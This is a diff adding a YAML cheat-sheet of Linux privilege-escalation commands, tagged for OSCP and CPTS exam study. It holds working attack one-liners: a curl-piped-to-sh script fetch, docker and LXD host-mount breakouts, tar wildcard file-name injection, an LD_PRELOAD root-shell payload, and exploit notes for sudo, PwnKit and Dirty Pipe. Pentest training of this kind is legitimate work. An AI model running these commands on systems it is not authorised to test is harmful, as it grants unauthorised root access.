@@ -1,0 +1,231 @@
+category: "privesc-linux"
+description: "Linux privilege escalation techniques"
+commands:
+  - name: "linpeas"
+    description: "Run LinPEAS enumeration script"
+    command: "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh"
+    tool: "linpeas"
+    tags: ["privesc", "linux", "enum", "auto"]
+    os: "linux"
+    exam: ["oscp", "cpts"]
+    notes: "Transfer to target first. Use python http.server or curl"
+
+  - name: "sudo-list"
+    description: "Check sudo permissions"
+    command: "sudo -l"
+    tool: "sudo"
+    tags: ["privesc", "linux", "sudo"]
+    os: "linux"
+    exam: ["oscp", "cpts"]
+    notes: "First thing to check! Look for NOPASSWD entries"
+
+  - name: "suid-find"
+    description: "Find SUID binaries"
+    command: "find / -perm -4000 -type f 2>/dev/null"
+    tool: "find"
+    tags: ["privesc", "linux", "suid"]
+    os: "linux"
+    exam: ["oscp", "cpts"]
+    notes: "Check each against GTFOBins"
+
+  - name: "capabilities-find"
+    description: "Find binaries with capabilities"
+    command: "getcap -r / 2>/dev/null"
+    tool: "getcap"
+    tags: ["privesc", "linux", "capabilities"]
+    os: "linux"
+    exam: ["oscp", "cpts"]
+
+  - name: "writable-files"
+    description: "Find world-writable files"
+    command: "find / -writable -type f 2>/dev/null | grep -v '/proc\\|/sys\\|/dev'"
+    tool: "find"
+    tags: ["privesc", "linux", "writable"]
+    os: "linux"
+    exam: ["oscp", "cpts"]
+
+  - name: "cron-enum"
+    description: "Enumerate cron jobs"
+    command: "cat /etc/crontab; ls -la /etc/cron.*; crontab -l 2>/dev/null"
+    tool: "linux"
+    tags: ["privesc", "linux", "cron"]
+    os: "linux"
+    exam: ["oscp", "cpts"]
+
+  - name: "internal-services"
+    description: "Find internal-only services"
+    command: "ss -tlnp"
+    tool: "ss"
+    tags: ["privesc", "linux", "services", "internal"]
+    os: "linux"
+    exam: ["oscp", "cpts"]
+    notes: "Look for services bound to 127.0.0.1"
+
+  - name: "passwd-writable"
+    description: "Check if /etc/passwd is writable"
+    command: "ls -la /etc/passwd /etc/shadow 2>/dev/null"
+    tool: "linux"
+    tags: ["privesc", "linux", "passwd"]
+    os: "linux"
+    exam: ["oscp", "cpts"]
+
+  - name: "kernel-version"
+    description: "Check kernel version for exploits"
+    command: "uname -a; cat /etc/os-release"
+    tool: "linux"
+    tags: ["privesc", "linux", "kernel"]
+    os: "linux"
+    exam: ["oscp", "cpts"]
+
+  - name: "path-hijack"
+    description: "Check PATH for hijacking opportunities"
+    command: "echo $PATH; find / -writable -type d 2>/dev/null | head -20"
+    tool: "linux"
+    tags: ["privesc", "linux", "path"]
+    os: "linux"
+    exam: ["oscp", "cpts"]
+
+  - name: "pspy-processes"
+    description: "Monitor processes without root (pspy)"
+    command: "./pspy64"
+    tool: "pspy"
+    tags: ["privesc", "linux", "processes", "monitor"]
+    os: "linux"
+    exam: ["oscp", "cpts"]
+    notes: "Transfer pspy to target. Reveals cron and other user processes"
+
+  - name: "gtfobins-sudo"
+    description: "GTFOBins sudo exploit template"
+    command: "sudo {BINARY} (check https://gtfobins.github.io/)"
+    tool: "gtfobins"
+    tags: ["privesc", "linux", "sudo", "gtfobins"]
+    os: "linux"
+    exam: ["oscp", "cpts"]
+    references: ["https://gtfobins.github.io/"]
+
+  - name: "docker-privesc"
+    description: "Docker group privilege escalation"
+    command: "docker run -v /:/mnt --rm -it alpine chroot /mnt sh"
+    tool: "docker"
+    tags: ["privesc", "linux", "docker"]
+    os: "linux"
+    exam: ["oscp", "cpts"]
+    notes: "Only if user is in docker group"
+
+  - name: "lxd-privesc"
+    description: "LXD group privilege escalation"
+    command: "lxc init ubuntu:22.04 privesc -c security.privileged=true; lxc config device add privesc host-root disk source=/ path=/mnt/root; lxc start privesc; lxc exec privesc -- /bin/bash"
+    tool: "lxd"
+    tags: ["privesc", "linux", "lxd"]
+    os: "linux"
+    exam: ["oscp", "cpts"]
+
+  # ── New entries ──
+
+  - name: "env-enum"
+    description: "Enumerate environment variables, PATH, network, and shells"
+    command: "env; set; echo $PATH; cat /etc/shells; route -n; arp -a"
+    tool: "linux"
+    tags: ["privesc", "linux", "enum"]
+    os: "linux"
+    exam: ["oscp", "cpts"]
+    notes: "Check for sensitive vars (passwords, API keys) and unusual PATH entries"
+
+  - name: "restricted-shell-escape"
+    description: "Escape restricted shells (rbash, rksh, rzsh)"
+    command: "ssh user@host -t 'bash --noprofile'"
+    tool: "ssh"
+    tags: ["privesc", "linux", "rbash", "escape"]
+    os: "linux"
+    exam: ["oscp", "cpts"]
+    notes: "Alt: vi :set shell=/bin/bash :shell, awk BEGIN{system()}, find -exec, python os.system()"
+
+  - name: "wildcard-abuse"
+    description: "Exploit tar wildcard expansion in cron jobs"
+    command: "echo '' > '--checkpoint-action=exec=shell.sh'; echo '' > --checkpoint=1"
+    tool: "linux"
+    tags: ["privesc", "linux", "wildcard", "tar", "cron"]
+    os: "linux"
+    exam: ["oscp", "cpts"]
+    notes: "Works when cron runs: tar cf backup.tar * — shell.sh should set SUID on /bin/bash"
+
+  - name: "nfs-nosquash"
+    description: "Exploit NFS shares with no_root_squash"
+    command: "showmount -e <target>; cat /etc/exports | grep no_root_squash"
+    tool: "nfs"
+    tags: ["privesc", "linux", "nfs"]
+    os: "linux"
+    exam: ["oscp", "cpts"]
+    notes: "Mount share, create SUID binary as root on attacker, execute on target"
+
+  - name: "ld-preload"
+    description: "LD_PRELOAD hijacking via sudo env_keep"
+    command: "gcc -shared -fPIC -nostartfiles -o /tmp/evil.so evil.c; sudo LD_PRELOAD=/tmp/evil.so <allowed_cmd>"
+    tool: "gcc"
+    tags: ["privesc", "linux", "ld_preload", "sudo"]
+    os: "linux"
+    exam: ["oscp", "cpts"]
+    notes: "Requires sudo -l showing env_keep+=LD_PRELOAD. evil.c: void _init(){setuid(0);system(\"/bin/bash\");}"
+
+  - name: "shared-object-hijack"
+    description: "Find missing shared objects for SUID/service binaries"
+    command: "strace <binary> 2>&1 | grep 'open.*no such file'; readelf -d <binary> | grep RUNPATH"
+    tool: "strace"
+    tags: ["privesc", "linux", "so", "hijack"]
+    os: "linux"
+    exam: ["oscp", "cpts"]
+    notes: "Place malicious .so in writable RUNPATH dir. Use ldd to list all deps"
+
+  - name: "python-hijack"
+    description: "Python library hijacking via writable module paths"
+    command: "python3 -c 'import sys; print(\"\\n\".join(sys.path))'"
+    tool: "python3"
+    tags: ["privesc", "linux", "python", "hijack"]
+    os: "linux"
+    exam: ["oscp", "cpts"]
+    notes: "Check for writable dirs in sys.path or writable module files. PYTHONPATH abuse also works"
+
+  - name: "tmux-hijack"
+    description: "Hijack root-owned tmux/screen sessions"
+    command: "tmux ls; ps aux | grep tmux; tmux -S /path/to/socket attach"
+    tool: "tmux"
+    tags: ["privesc", "linux", "tmux", "session"]
+    os: "linux"
+    exam: ["oscp", "cpts"]
+    notes: "Check socket permissions. Also try: screen -ls; screen -x root/"
+
+  - name: "logrotate-exploit"
+    description: "Exploit logrotate race condition with logrotten"
+    command: "logrotate --version; find / -writable -name '*.log' 2>/dev/null"
+    tool: "logrotate"
+    tags: ["privesc", "linux", "logrotate"]
+    os: "linux"
+    exam: ["oscp", "cpts"]
+    notes: "Use logrotten tool. Payload writes to /etc/bash_completion.d/ for shell on root login"
+
+  - name: "sudo-cve-check"
+    description: "Check sudo version for known CVEs"
+    command: "sudo --version"
+    tool: "sudo"
+    tags: ["privesc", "linux", "cve", "sudo"]
+    os: "linux"
+    exam: ["oscp", "cpts"]
+    notes: "CVE-2021-3156 Baron Samedit (<1.9.5p2), CVE-2019-14287 (<1.8.28, sudo -u#-1)"
+
+  - name: "pwnkit-check"
+    description: "Check pkexec version for PwnKit (CVE-2021-4034)"
+    command: "pkexec --version"
+    tool: "pkexec"
+    tags: ["privesc", "linux", "cve", "polkit", "pwnkit"]
+    os: "linux"
+    exam: ["oscp", "cpts"]
+    notes: "CVE-2021-4034 — affects polkit pkexec < 0.120. Run pwnkit exploit binary"
+
+  - name: "dirty-pipe-check"
+    description: "Check kernel version for Dirty Pipe (CVE-2022-0847)"
+    command: "uname -r"
+    tool: "linux"
+    tags: ["privesc", "linux", "cve", "kernel", "dirtypipe"]
+    os: "linux"
+    exam: ["oscp", "cpts"]
+    notes: "CVE-2022-0847 — kernel 5.8 to 5.16.11. Overwrites read-only files. Also check Dirty COW for older kernels"
